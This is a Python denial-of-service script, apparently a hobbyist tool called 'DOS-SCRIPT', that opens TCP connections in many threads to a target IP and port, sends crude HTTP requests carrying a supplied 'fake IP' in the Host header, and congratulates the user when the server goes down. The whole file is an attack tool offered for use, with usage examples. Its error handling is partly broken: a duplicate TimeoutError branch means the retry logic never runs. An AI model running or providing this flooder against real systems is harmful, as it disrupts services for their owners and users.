try:
    import socket
    import threading
    import random
    import sys
    import ipaddress
    import struct
    from time import sleep
    import colorama
except Exception as e:
    print(f"""
 ____   __   ____       ____   ___  ____  __  ____  ____ 
(    \ /  \ / ___) ___ / ___) / __)(  _ \(  )(  _ \(_  _)
 ) D ((  O )\___ \(___)\___ \( (__  )   / )(  ) __/  )(  
(____/ \__/ (____/     (____/ \___)(__\_)(__)(__)   (__)

PLEASE INSTALL THE REQUIRED LIBRARIES TO RUN THIS SCRIPT
            {e}
    """)
    exit(-1)

print("""
 ____   __   ____       ____   ___  ____  __  ____  ____ 
(    \ /  \ / ___) ___ / ___) / __)(  _ \(  )(  _ \(_  _)
 ) D ((  O )\___ \(___)\___ \( (__  )   / )(  ) __/  )(  
(____/ \__/ (____/     (____/ \___)(__\_)(__)(__)   (__) 

                    CREATED BY CONNOR
            PRESS CTRL + C TO QUIT THE ATTACK

""")

try:
    target,fake_ip,port,threads = sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4]
    print(f'INFO: TARGET:{target} FAKE IP:{fake_ip} PORT:{port} THREADS:{threads}')
except Exception:
    print("""
    WRONG USAGE.
    
    MODEL: dos_script.py target_ip fake_ip port threads
    EXAMPLE: dos_script.py 10.0.0.1 83.12.232.23 8 10
    """)
    exit(-1)

amount,retries = 0, 5
#THIS DUMB LIBRARY WON'T WORK WITHOUT THIS!!!!!!
colorama.init(convert=True)

sleep(3)

def attack():
    global amount
    global retries
    while True:
        color = random.choice([
        colorama.Fore.YELLOW,
        colorama.Fore.RED,
        colorama.Fore.BLUE,
        colorama.Fore.GREEN,
        colorama.Fore.CYAN,
        colorama.Fore.WHITE,
        colorama.Fore.MAGENTA,
        colorama.Fore.LIGHTBLUE_EX,
        colorama.Fore.LIGHTGREEN_EX,
        colorama.Fore.LIGHTRED_EX])  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target,int(port)))
        except TimeoutError:
            print("""
            
      COULD NOT CONNECT TO THE IP ADDRESS, RETURNING
            
            """)
            exit(-1)
        except ConnectionRefusedError:
            print('NO CONNECTION COULD BE MADE BECAUSE THE TARGET MACHINE ACTIVELY REFUSED IT. YOU ARE BEING RATE LIMITED.')
            exit(1)
        
        except TimeoutError:
            print(f'SERVER MAY BE DOWN.. TRYING {retries} MORE TIMES BEFORE QUTTING')
            sleep(0.5)
            if retries <= 0:
                print("""
                
                SERVER IS DOWN... WELL DONE..
                
                """)
                exit(2)
            retries -= 1
        else:
            retries = 5

        s.sendto((f"GET / {target} HTTP/1.1\r\n").encode('ascii'), (target, int(port)))
        s.sendto((f"Host: {fake_ip} \r\n\r\n").encode('ascii'), (target, int(port)))
        s.close()

        print(color + f'Connections: {amount}'); amount += 1
        random.seed(amount)

for i in range(int(threads)):
    thread = threading.Thread(target=attack)
    thread.start()

# attack()
